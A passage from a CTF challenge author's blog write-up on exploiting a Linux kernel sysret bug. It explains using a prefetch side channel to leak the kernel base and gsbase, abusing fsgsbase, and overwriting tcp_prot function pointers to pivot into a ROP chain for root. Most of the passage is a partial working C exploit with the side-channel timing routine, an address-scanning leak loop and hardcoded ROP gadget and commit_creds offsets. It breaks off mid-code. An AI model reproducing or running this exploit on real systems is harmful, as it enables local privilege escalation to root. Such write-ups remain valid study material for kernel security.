 the VR industry. Since Spectre and Meltdown, a flurry of new research 
for similar attacks started in academia, many of which are really fascinating 
attacks and reveal just how crazy modern hardware is. While some worked 
pretty well and would definitely be applicable in the real world, there 
are also many that really only work in pristine 
noiseless lab conditions on specific system configurations, topped off with an 
extremely low side-channel leakage rates. Perhaps it’s these latter 
attacks that cause real world exploit developers to often shrug off this
 vector of attack. </p><p>As documented in my <a href="https://www.willsroot.io/2022/12/entrybleed.html" target="_blank">EntryBleed attack</a> against KPTI, and ProjectZero’s <a href="https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html" target="_blank">writeup</a> for CVE-2022-42703, the <a href="https://gruss.cc/files/prefetch.pdf" target="_blank">prefetch µarch attack</a>
 from Daniel Gruss is one of those attacks that are extremely fast and 
accurate at leaking something sensitive (in this case, KASLR). Please 
refer to those links for more information regarding how the attack 
works.</p><p>Note that the kernel is running without KPTI so you can also reliably
 leak other sections of kernel memory asides from text and data (a 
limitation of EntryBleed). This isn’t me making the challenge easier 
though - when the Linux kernel detects that a CPU is hardware mitigated 
against Meltdown, KPTI is not <a href="https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/mm/pti.c#L118" target="_blank">enabled by default</a>.
 This is certainly a strange choice (though probably for the sake of performance), as Meltdown is not the only type of µarch 
attack that can break KASLR based on the shared page-table scheme. 
Regardless, this is perfect for this challenge as I ran it on a 
dedicated Cascade Lake server, so KPTI would be disabled by default.</p><p>The exploitation strategy from here should be to use a prefetch 
attack to leak the kernel base address, and then choose a target to 
overwrite in writeable kernel image sections. But an immediate issue 
that arises is that when executing <code>sysret</code>, the kernel is now using a userland GS register due to the preceeding <a href="https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/entry/entry_64.S#L225" target="_blank"><code>swapgs</code> instruction</a>.
 The GS register is vital to per cpu data referencing in the kernel - in
 fact, when the GPF executes with an invalid gs register, it repeatedly 
page faults until the system gives up and panics. This is because there 
are attempts made to access memory offsets from the GS register in these
 handlers. The exception handler in <code>error_entry</code> will only manually switch to a kernel gs if the exception source was from <a href="https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/entry/entry_64.S" target="_blank">userland</a>. </p><p>Like Zolutal, I first attempted to control the userland GS register with <code>prctl</code>, but the kernel checks that it is in <a href="https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/kernel/process_64.c#L751" target="_blank">userland address range</a>.
 There also really isn’t way for me to find something in kernel data or 
text to act as a fake gsbase either. Luckily, x86_64 has had the <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/best-practices/guidance-enabling-fsgsbase.html" target="_blank">fsgsbase extension</a> for a while now, which “allows applications to directly write to the FS and GS segment registers.” </p><p>Now we need to leak gsbase. It’s in physmap at a constant offset (I 
believe that the first percpu chunk always piggy backs off of the linear
 direct physical mapping according to <a href="https://elixir.bootlin.com/linux/v6.3.4/source/mm/percpu.c#L3055" target="_blank">comments</a>,
 so the offset would be RAM dependent?). In my exploit, I leaked physmap
 base by side-channeling the possible range of physmap addresses 
according to <a href="https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt" target="_blank">Linux documentation</a>,
 and applying a mask to the first leaked address before adding the 
correct offset to gsbase. This approximation has never failed for me 
yet.</p><p>Looking back on the output of my side-channel, I didn’t even need to 
leak physmap to get cpu 0’s gsbase. As this address comes after the 
linear direct physical mapping and is frequently used, it would likely 
always be the last address that falls into the physmap range to be 
side-channeled out of the TLB via a prefetch attack as this is a 
one-core system. Of course this would mean that the increment for 
virtual addresses in the side-channel have to align with this gsbase 
address, which mine did.</p><p>With all the leaks now, I presumed that exploitation would have been trivial, and first went for common targets like <code>modprobe_path</code>.
 Unfortunately, the exception handler seemed to really trash up the 
stack, writing around 0x860 bytes of data based on my debugging when I 
had it target the CEA region. This causes a lot of important things to 
be overwritten, and leaves the kernel in a highly unstable state that 
usually results in a panic quite quickly. Zolutal actually managed to 
get this working, and he discusses how he achieves this in his writeup. </p><p>What ended up working for me were function pointers in <code>tcp_prot</code>, a technique borrowed from an exploit for <a href="https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/" target="_blank">CVE-2022-29582</a>. <code>setsockopt</code>
 then provided me enough register control to stack pivot to another ROP 
chain (which I wrote ahead of time into an offset from kernel gsbase in a
 previous trigger of the sysret bug) and escalate privileges to root.</p><p>Originally, I enabled <code>oops=panic</code> and aimed to have players disable that setting in the first iteration of the <code>sysret</code>
 bug to continue exploitation as the general protection fault would lead
 to an oops. I wasn’t able to achieve it due to how the GPF handler 
trashed the stack, but if Zolutal managed to get <code>modprobe_path</code> overwrite working, then this might be feasible too.</p><p>











</p><p>The following is my exploit and its successful exploitation of the challenge:</p><p><span style="background-color: whitesmoke; display: block; font-family: monospace; max-width: 100%; overflow-x: auto; white-space: pre;"><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">define</span> _GNU_SOURCE</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;stdio.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;stdlib.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;stdint.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;stdbool.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;sched.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;fcntl.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;assert.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;unistd.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;errno.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;sys/ptrace.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;sys/types.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;sys/wait.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;sys/syscall.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;sys/user.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;sys/mman.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;sys/socket.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;netinet/in.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;netinet/tcp.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">

</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">pfail</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(<span class="hljs-type" style="color: #a31515;">char</span> *str)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
{
    perror(str);
    _exit(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
}

</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">assign_to_core</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(<span class="hljs-type" style="color: #a31515;">int</span> core_id)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
{
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">cpu_set_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> mask;

    CPU_ZERO(&amp;mask);
    CPU_SET(core_id, &amp;mask);

    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (sched_setaffinity(getpid(), </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(mask), &amp;mask) &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">)
        pfail(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"sched_setaffinity"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
}

</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">sidechannel</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(<span class="hljs-type" style="color: #a31515;">uint64_t</span> addr)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> {
  </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> a, b, c, d;
  </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">asm</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">volatile</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(<span class="hljs-string" style="color: #a31515;">".intel_syntax noprefix;"</span>
    <span class="hljs-string" style="color: #a31515;">"mfence;"</span>
    <span class="hljs-string" style="color: #a31515;">"rdtscp;"</span>
    <span class="hljs-string" style="color: #a31515;">"mov %0, rax;"</span>
    <span class="hljs-string" style="color: #a31515;">"mov %1, rdx;"</span>
    <span class="hljs-string" style="color: #a31515;">"xor rax, rax;"</span>
    <span class="hljs-string" style="color: #a31515;">"lfence;"</span>
    <span class="hljs-string" style="color: #a31515;">"prefetchnta qword ptr [%4];"</span>
    <span class="hljs-string" style="color: #a31515;">"prefetcht2 qword ptr [%4];"</span>
    <span class="hljs-string" style="color: #a31515;">"xor rax, rax;"</span>
    <span class="hljs-string" style="color: #a31515;">"lfence;"</span>
    <span class="hljs-string" style="color: #a31515;">"rdtscp;"</span>
    <span class="hljs-string" style="color: #a31515;">"mov %2, rax;"</span>
    <span class="hljs-string" style="color: #a31515;">"mov %3, rdx;"</span>
    <span class="hljs-string" style="color: #a31515;">"mfence;"</span>
    <span class="hljs-string" style="color: #a31515;">".att_syntax;"</span>
    : <span class="hljs-string" style="color: #a31515;">"=r"</span> (a), <span class="hljs-string" style="color: #a31515;">"=r"</span> (b), <span class="hljs-string" style="color: #a31515;">"=r"</span> (c), <span class="hljs-string" style="color: #a31515;">"=r"</span> (d)
    : <span class="hljs-string" style="color: #a31515;">"r"</span> (addr)
    : <span class="hljs-string" style="color: #a31515;">"rax"</span>, <span class="hljs-string" style="color: #a31515;">"rbx"</span>, <span class="hljs-string" style="color: #a31515;">"rcx"</span>, <span class="hljs-string" style="color: #a31515;">"rdx"</span>)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
  a = (b &lt;&lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">32</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) | a;
  c = (d &lt;&lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">32</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) | c;
  </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> c - a;
}

</span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// #define ITERATIONS 1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// this needs to be fine tuned to work best for the gsbase and kbase leak</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">define</span> THRESHOLD 50</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// 8 gb more than enough</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">define</span> POTENTIAL_END (8ull &lt;&lt; 30)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">

</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> threshold = THRESHOLD;

</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">prefetch_leak</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(<span class="hljs-type" style="color: #a31515;">uint64_t</span> scan_start, <span class="hljs-type" style="color: #a31515;">uint64_t</span> scan_end, <span class="hljs-type" style="color: #a31515;">uint64_t</span> step)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> 
{
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> size = (scan_end - scan_start) / step;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *data = </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">calloc</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(size, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">));
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> min = ~</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, addr = ~</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, potential_end = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">do</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    {
        </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">bool</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">set</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> = </span><span class="hljs-literal" style="color: #a31515; font-family: monospace; white-space: pre;">false</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> idx = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; idx &lt; size; idx++) 
        {
            </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> test_addr = scan_start + idx * step;
            </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (potential_end &amp;&amp; test_addr &gt; potential_end)
                </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">break</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
            syscall(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">104</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
            </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> time = sidechannel(test_addr);
            </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (time &lt; threshold)
            {
                </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">printf</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"%llx %ld\n"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, (scan_start + idx * step), time);
                data[idx]++;
                </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (!potential_end)
                    potential_end = test_addr + POTENTIAL_END;
            }
        }

        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; size; i++)
        {

                </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (!</span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">set</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> &amp;&amp; data[i] &gt;= </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">)
                {
                    addr = scan_start + i * step;
                    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">set</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> = </span><span class="hljs-literal" style="color: #a31515; font-family: monospace; white-space: pre;">true</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
                }
        }
    } </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">while</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (addr == ~</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">free</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(data);

    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> addr;
}

</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">define</span> KERNEL_STEP 0x200000ull</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">define</span> KERNEL_BOTTOM 0xffffffff80000000ull</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">define</span> KERNEL_TOP 0xffffffffc0000000ull</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">define</span> PHYSMAP_STEP 0x200000ull</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">define</span> PHYSMAP_BOTTOM 0xffff888000000000ull</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">define</span> PHYSMAP_TOP 0xffffc88000000000ull</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">

</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> kbase = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff81000000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull;
</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> curr_cpu_gsbase = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffff88813bc00000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull;

</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> trampoline = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff81a00ee1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff81000000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull;
</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> pop_rsp = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff811083d0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff81000000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull;
</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> pop_rsp_rsi = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff81514860</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff81000000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull;
</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> push_rcx_jmp_ptr_rcx = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff8136b694</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff81000000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull;
</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> pop_rsi_rdi_rbp = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff81f006d9</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff81000000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull;
</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> pop_rdi_rcx = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff81cda0b8</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff81000000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull;
</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> pop_rdi = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff811d63f3</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff81000000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull;
</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> tcp_prot = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff82160180</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff81000000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull;
</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> commit_creds = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff8109b810</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff81000000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull;
</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> init_cred = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff8203ade0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffff81000000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">ull;

</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">nopper</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(<span class="hljs-keyword" style="color: blue;">struct</span> user_regs_struct *regs)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> {}

